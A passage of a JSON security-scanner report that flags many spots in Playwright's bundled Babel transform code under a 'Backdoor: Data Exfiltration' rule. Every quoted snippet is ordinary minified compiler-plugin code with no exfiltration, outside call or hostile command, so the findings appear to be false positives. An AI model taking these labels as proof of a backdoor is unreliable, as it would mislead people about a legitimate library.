                      "text": ",XTe.declare)(({types:e,template:t,assertVersion:r,version:n})=>(r(\"^7.12.0 || >8.0.0-alpha <8.0.0-beta\"),{name:\"transform-class-static-block\",inherits:n[0]===\"8\"?void 0:GN().default,pre(){(0,HN.enableFeature)(this.file,HN.FEATURES.staticBlocks,!1)},visitor:{ClassBody(s){let{scope:i}=s,a=new Set,o=s.get(\"body\");for(let l of o)l.isPrivate()&&a.add(l.get(\"key.id\").node.name);for(let l of o){if(!l.isStaticBlock())continue;let u=JTe(i,a);a.add(u);let c=e.privateName(e.identifier(u)),f,p=l.node.body;p.length===1&&e.isExpressionStatement(p[0])?f=e.inheritsComments(p[0].expression,p[0]):f=t.expression.ast",
                      "markdown": "`,XTe.declare)(({types:e,template:t,assertVersion:r,version:n})=>(r(\"^7.12.0 || >8.0.0-alpha <8.0.0-beta\"),{name:\"transform-class-static-block\",inherits:n[0]===\"8\"?void 0:GN().default,pre(){(0,HN.enableFeature)(this.file,HN.FEATURES.staticBlocks,!1)},visitor:{ClassBody(s){let{scope:i}=s,a=new Set,o=s.get(\"body\");for(let l of o)l.isPrivate()&&a.add(l.get(\"key.id\").node.name);for(let l of o){if(!l.isStaticBlock())continue;let u=JTe(i,a);a.add(u);let c=e.privateName(e.identifier(u)),f,p=l.node.body;p.length===1&&e.isExpressionStatement(p[0])?f=e.inheritsComments(p[0].expression,p[0]):f=t.expression.ast`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2028,
                  "startColumn": 489,
                  "endLine": 2028,
                  "endColumn": 494,
                  "snippet": {
                    "text": "=[b]:i.replaceWith(b)}}},s=Oe.traverse.visitors.merge([n,{Function(i){i.skip()}}]);return{name:\"proposal-explicit-resource-management\",inherits:KTe.default,visitor:Oe.traverse.visitors.merge([n,{Program(i){if(t.clear(),i.node.sourceType!==\"module\"||!i.node.body.some(r))return;let a=[];for(let l of i.get(\"body\")){if(l.isFunctionDeclaration()||l.isImportDeclaration())continue;let{node:u}=l,c=!0;if(l.isExportDefaultDeclaration()){var o;let{declaration:f}=l.node,p;if(Oe.types.isClassDeclaration(f))p=f.id,f.id=null,f=Oe.types.toExpression(f);else if(!Oe.types.isExpression(f))continue;(o=p)!=null||(p=i.s",
                    "rendered": {
                      "text": "=[b]:i.replaceWith(b)}}},s=Oe.traverse.visitors.merge([n,{Function(i){i.skip()}}]);return{name:\"proposal-explicit-resource-management\",inherits:KTe.default,visitor:Oe.traverse.visitors.merge([n,{Program(i){if(t.clear(),i.node.sourceType!==\"module\"||!i.node.body.some(r))return;let a=[];for(let l of i.get(\"body\")){if(l.isFunctionDeclaration()||l.isImportDeclaration())continue;let{node:u}=l,c=!0;if(l.isExportDefaultDeclaration()){var o;let{declaration:f}=l.node,p;if(Oe.types.isClassDeclaration(f))p=f.id,f.id=null,f=Oe.types.toExpression(f);else if(!Oe.types.isExpression(f))continue;(o=p)!=null||(p=i.s",
                      "markdown": "`=[b]:i.replaceWith(b)}}},s=Oe.traverse.visitors.merge([n,{Function(i){i.skip()}}]);return{name:\"proposal-explicit-resource-management\",inherits:KTe.default,visitor:Oe.traverse.visitors.merge([n,{Program(i){if(t.clear(),i.node.sourceType!==\"module\"||!i.node.body.some(r))return;let a=[];for(let l of i.get(\"body\")){if(l.isFunctionDeclaration()||l.isImportDeclaration())continue;let{node:u}=l,c=!0;if(l.isExportDefaultDeclaration()){var o;let{declaration:f}=l.node,p;if(Oe.types.isClassDeclaration(f))p=f.id,f.id=null,f=Oe.types.toExpression(f);else if(!Oe.types.isExpression(f))continue;(o=p)!=null||(p=i.s`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2018,
                  "startColumn": 363,
                  "endLine": 2018,
                  "endColumn": 368,
                  "snippet": {
                    "text": "ction()||m.isTryStatement()||m.isCatchClause()?i.replaceWith(Oe.types.blockStatement([p])):i.isStaticBlock()?i.node.body=[p]:i.replaceWith(p)}else{let u=null,c=!1;for(let y of i.node.body){var l;if(!r(y))continue;(l=u)!=null||(u=i.scope.generateUidIdentifier(\"stack\"));let v=y.kind===\"await using\"||t.get(y)===1;c||(c=v),t.delete(y)||(y.kind=\"const\"),y.declarations.forEach(I=>{let D=[Oe.types.cloneNode(u),I.init];v&&D.push(Oe.types.booleanLiteral(!0)),I.init=Oe.types.callExpression(a.addHelper(\"using\"),D)})}if(!u)return;let f=i.scope.generateUidIdentifier(\"error\"),p=i.scope.generateUidIdentifier(\"has",
                    "rendered": {
                      "text": "ction()||m.isTryStatement()||m.isCatchClause()?i.replaceWith(Oe.types.blockStatement([p])):i.isStaticBlock()?i.node.body=[p]:i.replaceWith(p)}else{let u=null,c=!1;for(let y of i.node.body){var l;if(!r(y))continue;(l=u)!=null||(u=i.scope.generateUidIdentifier(\"stack\"));let v=y.kind===\"await using\"||t.get(y)===1;c||(c=v),t.delete(y)||(y.kind=\"const\"),y.declarations.forEach(I=>{let D=[Oe.types.cloneNode(u),I.init];v&&D.push(Oe.types.booleanLiteral(!0)),I.init=Oe.types.callExpression(a.addHelper(\"using\"),D)})}if(!u)return;let f=i.scope.generateUidIdentifier(\"error\"),p=i.scope.generateUidIdentifier(\"has",
                      "markdown": "`ction()||m.isTryStatement()||m.isCatchClause()?i.replaceWith(Oe.types.blockStatement([p])):i.isStaticBlock()?i.node.body=[p]:i.replaceWith(p)}else{let u=null,c=!1;for(let y of i.node.body){var l;if(!r(y))continue;(l=u)!=null||(u=i.scope.generateUidIdentifier(\"stack\"));let v=y.kind===\"await using\"||t.get(y)===1;c||(c=v),t.delete(y)||(y.kind=\"const\"),y.declarations.forEach(I=>{let D=[Oe.types.cloneNode(u),I.init];v&&D.push(Oe.types.booleanLiteral(!0)),I.init=Oe.types.callExpression(a.addHelper(\"using\"),D)})}if(!u)return;let f=i.scope.generateUidIdentifier(\"error\"),p=i.scope.generateUidIdentifier(\"has`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 6622,
                  "endLine": 2009,
                  "endColumn": 6627,
                  "snippet": {
                    "text": "claration(\"using\",[Oe.types.variableDeclarator(o,Oe.types.cloneNode(l))]))},\"BlockStatement|StaticBlock\"(i,a){if(a.availableHelper(\"usingCtx\")){let u=null,c=!1;for(let b of i.node.body){var o;if(!r(b))continue;(o=u)!=null||(u=i.scope.generateUidIdentifier(\"usingCtx\"));let d=b.kind===\"await using\"||t.get(b)===1;c||(c=d),t.delete(b)||(b.kind=\"const\");for(let y of b.declarations)y.init=Oe.types.callExpression(Oe.types.memberExpression(Oe.types.cloneNode(u),d?Oe.types.identifier(\"a\"):Oe.types.identifier(\"u\")),[y.init])}if(!u)return;let f=Oe.types.callExpression(Oe.types.memberExpression(Oe.types.cloneN",
                    "rendered": {
                      "text": "claration(\"using\",[Oe.types.variableDeclarator(o,Oe.types.cloneNode(l))]))},\"BlockStatement|StaticBlock\"(i,a){if(a.availableHelper(\"usingCtx\")){let u=null,c=!1;for(let b of i.node.body){var o;if(!r(b))continue;(o=u)!=null||(u=i.scope.generateUidIdentifier(\"usingCtx\"));let d=b.kind===\"await using\"||t.get(b)===1;c||(c=d),t.delete(b)||(b.kind=\"const\");for(let y of b.declarations)y.init=Oe.types.callExpression(Oe.types.memberExpression(Oe.types.cloneNode(u),d?Oe.types.identifier(\"a\"):Oe.types.identifier(\"u\")),[y.init])}if(!u)return;let f=Oe.types.callExpression(Oe.types.memberExpression(Oe.types.cloneN",
                      "markdown": "`claration(\"using\",[Oe.types.variableDeclarator(o,Oe.types.cloneNode(l))]))},\"BlockStatement|StaticBlock\"(i,a){if(a.availableHelper(\"usingCtx\")){let u=null,c=!1;for(let b of i.node.body){var o;if(!r(b))continue;(o=u)!=null||(u=i.scope.generateUidIdentifier(\"usingCtx\"));let d=b.kind===\"await using\"||t.get(b)===1;c||(c=d),t.delete(b)||(b.kind=\"const\");for(let y of b.declarations)y.init=Oe.types.callExpression(Oe.types.memberExpression(Oe.types.cloneNode(u),d?Oe.types.identifier(\"a\"):Oe.types.identifier(\"u\")),[y.init])}if(!u)return;let f=Oe.types.callExpression(Oe.types.memberExpression(Oe.types.cloneN`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 4722,
                  "endLine": 2009,
                  "endColumn": 4727,
                  "snippet": {
                    "text": "lee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default=void 0;var UTe=mt(),RN=kN(),qN=Ia(),VTe=MN(),tOe=Ap.default=(0,UTe.declare)((e,t)=>{e.assertVersion(7);var{legacy:r}=t;let{version:n}=t;if(r||n===\"legac",
                    "rendered": {
                      "text": "lee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default=void 0;var UTe=mt(),RN=kN(),qN=Ia(),VTe=MN(),tOe=Ap.default=(0,UTe.declare)((e,t)=>{e.assertVersion(7);var{legacy:r}=t;let{version:n}=t;if(r||n===\"legac",
                      "markdown": "`lee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default=void 0;var UTe=mt(),RN=kN(),qN=Ia(),VTe=MN(),tOe=Ap.default=(0,UTe.declare)((e,t)=>{e.assertVersion(7);var{legacy:r}=t;let{version:n}=t;if(r||n===\"legac`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 4663,
                  "endLine": 2009,
                  "endColumn": 4668,
                  "snippet": {
                    "text": "guments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default=void 0;var UTe=mt(),RN=kN(),qN=Ia(),VTe=MN(),tOe=Ap.default=(0,UTe.declare)((e,t)=>{e.assertV",
                    "rendered": {
                      "text": "guments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default=void 0;var UTe=mt(),RN=kN(),qN=Ia(),VTe=MN(),tOe=Ap.default=(0,UTe.declare)((e,t)=>{e.assertV",
                      "markdown": "`guments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default=void 0;var UTe=mt(),RN=kN(),qN=Ia(),VTe=MN(),tOe=Ap.default=(0,UTe.declare)((e,t)=>{e.assertV`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 4616,
                  "endLine": 2009,
                  "endColumn": 4621,
                  "snippet": {
                    "text": "ts\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default=void 0;var UTe=mt(),RN=kN(),qN=Ia(),VTe=MN(),t",
                    "rendered": {
                      "text": "ts\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default=void 0;var UTe=mt(),RN=kN(),qN=Ia(),VTe=MN(),t",
                      "markdown": "`ts\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default=void 0;var UTe=mt(),RN=kN(),qN=Ia(),VTe=MN(),t`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 4569,
                  "endLine": 2009,
                  "endColumn": 4574,
                  "snippet": {
                    "text": "].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default",
                    "rendered": {
                      "text": "].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default",
                      "markdown": "`].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments\")[1].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[0].node),ce.types.cloneNode(e.get(\"arguments.2.arguments\")[1].node)]))}},ZIe=Pp.default=qTe});var UN=E(Ap=>{\"use strict\";Object.defineProperty(Ap,\"__esModule\",{value:!0});Ap.default`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 4297,
                  "endLine": 2009,
                  "endColumn": 4302,
                  "snippet": {
                    "text": ".right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.typ",
                    "rendered": {
                      "text": ".right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.typ",
                      "markdown": "`.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"arguments\")[0].node),ce.typ`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 4244,
                  "endLine": 2009,
                  "endColumn": 4249,
                  "snippet": {
                    "text": "placeWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[",
                    "rendered": {
                      "text": "placeWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[",
                      "markdown": "`placeWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 4190,
                  "endLine": 2009,
                  "endColumn": 4195,
                  "snippet": {
                    "text": ")},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.cal",
                    "rendered": {
                      "text": ")},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.cal",
                      "markdown": "`)},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\").name&&e.replaceWith(ce.types.cal`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 2009,
                  "startColumn": 4156,
                  "endLine": 2009,
                  "endColumn": 4161,
                  "snippet": {
                    "text": "Te(e)||MTe(e,t);r&&e.replaceWith(r)},ObjectExpression(e,t){let r=BN(e)||RTe(e,t);r&&e.replaceWith(r)},AssignmentExpression(e,t){D1.has(e.node.right)&&e.replaceWith(ce.types.callExpression(t.addHelper(\"initializerDefineProperty\"),[ce.types.cloneNode(e.get(\"left.object\").node),ce.types.stringLiteral(e.get(\"left.property\").node.name||e.get(\"left.property\").node.value),ce.types.cloneNode(e.get(\"right.arguments\")[0].node),ce.types.cloneNode(e.get(\"right.arguments\")[1].node)]))},CallExpression(e,t){e.node.arguments.length===3&&D1.has(e.node.arguments[2])&&e.node.callee.name===t.addHelper(\"defineProperty\"",
                    "rendered": {
